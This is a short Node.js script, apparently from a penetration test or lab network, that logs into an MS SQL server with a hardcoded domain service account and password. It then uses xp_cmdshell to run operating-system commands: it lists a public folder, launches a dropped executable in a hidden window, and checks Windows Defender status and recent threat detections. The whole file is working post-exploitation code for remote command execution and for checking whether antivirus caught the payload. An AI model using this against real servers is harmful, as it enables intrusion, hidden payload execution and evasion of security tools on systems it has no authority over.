const sql = require("mssql");
(async () => {
  await sql.connect({
    server: "172.16.0.11",
    database: "master",
    authentication: {
      type: "ntlm",
      options: { domain: "ODYSSEY", userName: "svc-mssql", password: "cml958782" },
    },
    options: { encrypt: false, trustServerCertificate: true },
    port: 1433,
    requestTimeout: 25000,
  });
  const q = async (s) => {
    try {
      console.log("=>", JSON.stringify((await sql.query(s)).recordset));
    } catch (e) {
      console.log("ERR", e.message);
    }
  };
  await q("EXEC xp_cmdshell 'dir C:\\Users\\Public'");
  await q(
    "EXEC xp_cmdshell 'powershell -c \"try { $p=Start-Process -FilePath C:\\Users\\Public\\p_who.exe -PassThru -WindowStyle Hidden; Start-Sleep 2; Write-Output (\\\"pid=\\\"+$p.Id+\\\" hasexited=\\\"+$p.HasExited+\\\" exit=\\\"+$p.ExitCode); Get-Process -Id $p.Id -ErrorAction SilentlyContinue | Out-String } catch { $_.Exception.Message }\"'"
  );
  await q(
    "EXEC xp_cmdshell 'powershell -c \"Get-MpComputerStatus | Select AMRunningMode,RealTimeProtectionEnabled,AntivirusEnabled | fl | Out-String; Get-MpThreatDetection | Select -First 5 | fl | Out-String\"'"
  );
  process.exit(0);
})().catch((e) => {
  console.log(e);
  process.exit(1);
});
